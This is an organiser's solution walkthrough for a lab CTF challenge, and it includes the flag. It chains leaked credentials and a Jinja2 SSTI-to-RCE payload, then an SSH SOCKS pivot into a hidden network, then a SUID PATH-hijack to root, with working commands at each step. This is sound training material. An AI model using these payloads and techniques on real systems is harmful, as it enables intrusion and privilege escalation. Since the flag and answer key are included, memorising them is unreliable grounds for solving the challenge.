# WALKTHROUGH — "Ambiorix" (PRIVATE — organisers only)

> Complete intended solution path. Keep this out of players' hands at the con.
> Flag: **`flag{atuatuca_ambush_54bc}`**

## Overview

| | |
|---|---|
| **Category** | Web → Network pivoting → Linux privesc (multi-stage) |
| **Difficulty** | Medium |
| **Est. solve time** | 30–75 min (team of two) |
| **Flag** | `flag{atuatuca_ambush_54bc}` |

**Intended path (one line):** leaked creds → login → **Jinja2 SSTI → RCE** on
`castra` → read deploy notes → **SSH into `castra`** → read muster roll →
**SSH `-D` dynamic forward + proxychains** to the hidden `10.10.10.0/24` →
SSH into `arduenna` as `eburo` → **SUID-root PATH-hijack** → read `/root/flag.txt`.

```
attacker ── guest 172.20.0.0/24 ── castra(pivot) ── internal 10.10.10.0/24 ── arduenna(target)
 172.20.0.5                        .10 / 10.10.10.5                            10.10.10.10
```

The player plays from the **attacker** container:

```bash
docker compose exec attacker bash
```

All commands below are run from inside that container.

---

## Stage 0 — Recon on the frontier (guest network)

The scout is `172.20.0.5`. Only `castra` (`172.20.0.10`) is reachable; the inner
network does not exist yet from the player's point of view.

```bash
nmap -sn 172.20.0.0/24            # finds 172.20.0.10 (castra) + the gateway
nmap -sT -p- 172.20.0.10          # 22/tcp ssh, 80/tcp http
curl -s http://172.20.0.10/       # Castra Legionis — Frontier Watch Console
```

---

## Stage 1 — Foothold: leaked creds → SSTI → RCE

### 1a. Find the leaked recruit account

The login page ships a dev-reminder in an HTML comment:

```bash
curl -s http://172.20.0.10/login | grep -i -- '-->'
# <!-- TODO(centurion): disable the shared recruit login before we go live.
#      creds still: tiro / AveLegioXIV-54 -->
```

### 1b. Log in and find the injection point

Log in (keep a cookie jar), then probe the watch-report form. The **report body
is escaped** (safe); the **`sigil`** field is rendered through
`render_template_string()` → SSTI.

```bash
C=/tmp/jar
curl -s -c $C -b $C -d 'username=tiro&password=AveLegioXIV-54' http://172.20.0.10/login

# confirm the injection
curl -s -c $C -b $C --data-urlencode 'report=' --data-urlencode 'sigil={{7*7}}' \
     http://172.20.0.10/board | grep -A1 'class="sigil"'
#   <pre class="sigil">49</pre>     <-- 7*7 rendered -> Jinja2 SSTI
```

> Note: a small "discipline filter" rejects the literal word `config` on a sigil
> (blocks the low-effort `{{config}}` dump). The intended RCE gadget avoids it.

### 1c. SSTI → RCE

Standard Jinja2 gadget (reaches `os` via `cycler`'s module globals):

```bash
RCE='{{ cycler.__init__.__globals__.os.popen("id").read() }}'
curl -s -c $C -b $C --data-urlencode 'report=' --data-urlencode "sigil=$RCE" \
     http://172.20.0.10/board | grep -A1 'class="sigil"'
#   uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Code execution as **`www-data`** on `castra`.

### 1d. Loot the foothold (breadcrumb #1)

```bash
READ='{{ cycler.__init__.__globals__.os.popen("cat /opt/castra/DEPLOY_NOTES.txt").read() }}'
curl -s -c $C -b $C --data-urlencode 'report=' --data-urlencode "sigil=$READ" \
     http://172.20.0.10/board
```

The deploy notes reveal:
- maintenance SSH on `castra`: **`scout` / `FrontierWatch-54BC`**
- an **inner camp** at **`10.10.10.10` (arduenna)**, *not routable from the frontier*
- the inner-camp creds live in **scout's home directory**

(Confirm the pivot surface: `ip a` / `ip r` via the same RCE shows a **second NIC
`10.10.10.5/24`** on `castra`.)

---

## Stage 2 — Pivot into the hidden war-camp

### 2a. SSH into castra and read the muster roll (breadcrumb #2)

```bash
sshpass -p 'FrontierWatch-54BC' ssh -o StrictHostKeyChecking=no scout@172.20.0.10
# (or just: ssh scout@172.20.0.10  and type the password)

scout@castra:~$ cat ~/muster.txt
#   camp login ....... eburo / ArduennaShadow
#   ...a root-owned roll-call tool in /usr/local/bin on the camp box...
scout@castra:~$ exit
```

### 2b. Open a SOCKS proxy through castra (SSH dynamic forward)

```bash
ssh -D 1080 -fN scout@172.20.0.10          # password: FrontierWatch-54BC
# proxychains4 is pre-configured: socks5 127.0.0.1 1080  (/etc/proxychains4.conf)
```

### 2c. Confirm the inner network is now reachable

```bash
proxychains4 nmap -sT -Pn -p22 10.10.10.10     # 22/tcp open on arduenna
```

---

## Stage 3 — Inner objective: SUID PATH-hijack → root → flag

### 3a. SSH to the target through the tunnel

```bash
proxychains4 ssh -o StrictHostKeyChecking=no eburo@10.10.10.10
# password: ArduennaShadow
```

### 3b. Find the SUID misconfig

```bash
eburo@arduenna:~$ find / -perm -4000 -type f 2>/dev/null
#   ... /usr/local/bin/castellum

eburo@arduenna:~$ cat /usr/local/src/castellum.c      # source is readable
#   system("date +\"...\"");   <-- SUID root calls `date` by RELATIVE name
```

`castellum` runs as root but calls `date` without an absolute path, inheriting
our `$PATH`.

### 3c. Hijack PATH to run code as root

```bash
eburo@arduenna:~$ cd /tmp
eburo@arduenna:/tmp$ printf '#!/bin/sh\n/bin/sh\n' > date   # or: cat /root/flag.txt
eburo@arduenna:/tmp$ chmod +x date
eburo@arduenna:/tmp$ PATH=/tmp:$PATH /usr/local/bin/castellum
[castellum] verifying the watch rotation...
# id -> uid=0(root)
```

### 3d. Capture the flag

```bash
# cat /root/flag.txt
flag{atuatuca_ambush_54bc}
```

---

## Automated verification

`test/solve.sh` runs this entire path non-interactively and asserts the flag:

```bash
docker compose up -d --build
./test/solve.sh          # prints "==== PASS ====" and the flag
```

## Intended path vs. traps

- **One intended path.** The only RCE surface is the `sigil` SSTI; report bodies
  are escaped. The only route to `arduenna` is the SSH `-D` pivot through
  `castra` (enforced by the `internal: true` network).
- **No guessing.** Every credential/host is discoverable (HTML comment →
  deploy notes → muster roll → readable SUID source). No brute force required.
- **Alternate-but-equivalent pivots** (sshuttle / chisel / manual `ip route`
  through `castra`) also work — they're the same beat, not unintended wins.
